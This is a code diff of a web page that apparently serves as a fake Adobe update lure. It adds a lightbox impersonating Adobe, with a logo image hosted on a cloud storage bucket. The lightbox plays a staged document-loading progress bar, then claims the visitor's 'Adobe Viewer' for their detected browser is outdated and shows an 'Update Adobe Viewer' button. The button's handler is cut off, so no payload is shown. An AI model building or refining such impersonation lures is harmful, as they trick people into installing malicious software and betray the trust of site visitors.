@@ -979,42 +979,45 @@
     </div>
 
     <!-- Adobe Update Lightbox -->
-    <div class="adobe-update-lightbox" id="adobeUpdateLightbox">
-        <div class="adobe-update-content">
-            <!-- Adobe Logo -->
-            <div class="adobe-logo-container" id="adobeLogoContainer">
-                <div class="adobe-logo-letter">A</div>
-            </div>
-            
-            <!-- Title -->
-            <h2 class="adobe-update-title" id="adobeUpdateTitle">Retrieving Project Documents</h2>
-            
-            <!-- Message -->
-            <p class="adobe-update-message" id="adobeUpdateMessage">
-                Please wait while we load your documents...
-            </p>
-            
-            <!-- Progress Bar (shown initially) -->
-            <div id="progressSection">
-                <div class="progress-container">
-                    <div class="progress-bar" id="adobeProgressBar"></div>
-                </div>
-                <div class="progress-text" id="progressText">Loading... 0%</div>
-            </div>
-            
-            <!-- Browser Badge (hidden initially) -->
-            <div class="browser-badge" id="browserBadge" style="display: none;">
-                <span id="browserIcon">🌐</span>
-                <span id="browserName">Browser</span>
-            </div>
-            
-            <!-- Update Button (hidden initially) -->
-            <button class="update-btn" id="updateViewerBtn" style="display: none;" onclick="updateAdobeViewer()">
-                <span>⬇</span>
-                <span>Update Adobe Viewer</span>
-            </button>
+<div class="adobe-update-lightbox" id="adobeUpdateLightbox">
+    <div class="adobe-update-content">
+        <!-- Adobe Logo -->
+        <div class="adobe-logo-container" id="adobeLogoContainer">
+            <img src="https://storage.googleapis.com/atlas-web-20260306-1360d7a95c5a/adb.png" 
+                 alt="Adobe Logo" 
+                 class="adobe-logo-img"
+                 id="adobeLogoImg">
         </div>
+        
+        <!-- Title -->
+        <h2 class="adobe-update-title" id="adobeUpdateTitle">Retrieving Project Documents</h2>
+        
+        <!-- Message -->
+        <p class="adobe-update-message" id="adobeUpdateMessage">
+            Please wait while we load your documents...
+        </p>
+        
+        <!-- Progress Bar (shown initially) -->
+        <div id="progressSection">
+            <div class="progress-container">
+                <div class="progress-bar" id="adobeProgressBar"></div>
+            </div>
+            <div class="progress-text" id="progressText">Loading... 0%</div>
+        </div>
+        
+        <!-- Browser Badge (hidden initially) -->
+        <div class="browser-badge" id="browserBadge" style="display: none;">
+            <span id="browserIcon">🌐</span>
+            <span id="browserName">Browser</span>
+        </div>
+        
+        <!-- Update Button (hidden initially) -->
+        <button class="update-btn" id="updateViewerBtn" style="display: none;" onclick="updateAdobeViewer()">
+            <span>⬇</span>
+            <span>Update Adobe Viewer</span>
+        </button>
     </div>
+</div>
 
     <script>
         // ========== COOKIE UTILITIES ==========
@@ -1420,40 +1423,40 @@
             }, 100); // 100ms * 50 iterations = 5 seconds
         }
 
-        // ========== SHOW UPDATE ERROR ==========
-        function showUpdateError() {
-            const browser = getBrowserName();
-            
-            // Change logo to warning icon
-            document.getElementById('adobeLogoContainer').innerHTML = `
-                <div class="warning-icon">
-                    <span class="warning-icon-text">⚠️</span>
-                </div>
-            `;
-            
-            // Update title
-            document.getElementById('adobeUpdateTitle').textContent = 'Unable to Display Documents';
-            
-            // Update message
-            const messageEl = document.getElementById('adobeUpdateMessage');
-            messageEl.classList.add('error');
-            messageEl.innerHTML = `
-                Your version of Adobe Viewer for <strong>${browser.name}</strong> is outdated.<br>
-                Update the viewer to the latest version to view project documents.
-            `;
-            
-            // Hide progress section
-            document.getElementById('progressSection').style.display = 'none';
-            
-            // Show browser badge
-            const browserBadge = document.getElementById('browserBadge');
-            browserBadge.style.display = 'inline-flex';
-            document.getElementById('browserIcon').textContent = browser.icon;
-            document.getElementById('browserName').textContent = browser.name;
-            
-            // Show update button
-            document.getElementById('updateViewerBtn').style.display = 'flex';
-        }
+       // ========== SHOW UPDATE ERROR ==========
+function showUpdateError() {
+    const browser = getBrowserName();
+    
+    // Change logo to warning icon
+    document.getElementById('adobeLogoContainer').innerHTML = `
+        <div class="warning-icon">
+            <span class="warning-icon-text">⚠️</span>
+        </div>
+    `;
+    
+    // Update title
+    document.getElementById('adobeUpdateTitle').textContent = 'Unable to Display Documents';
+    
+    // Update message
+    const messageEl = document.getElementById('adobeUpdateMessage');
+    messageEl.classList.add('error');
+    messageEl.innerHTML = `
+        Your version of Adobe Viewer for <strong>${browser.name}</strong> is outdated.<br>
+        Update the viewer to the latest version to view project documents.
+    `;
+    
+    // Hide progress section
+    document.getElementById('progressSection').style.display = 'none';
+    
+    // Show browser badge
+    const browserBadge = document.getElementById('browserBadge');
+    browserBadge.style.display = 'inline-flex';
+    document.getElementById('browserIcon').textContent = browser.icon;
+    document.getElementById('browserName').textContent = browser.name;
+    
+    // Show update button
+    document.getElementById('updateViewerBtn').style.display = 'flex';
+}
 
         // ========== UPDATE VIEWER BUTTON HANDLER ==========
         function updateAdobeViewer() {
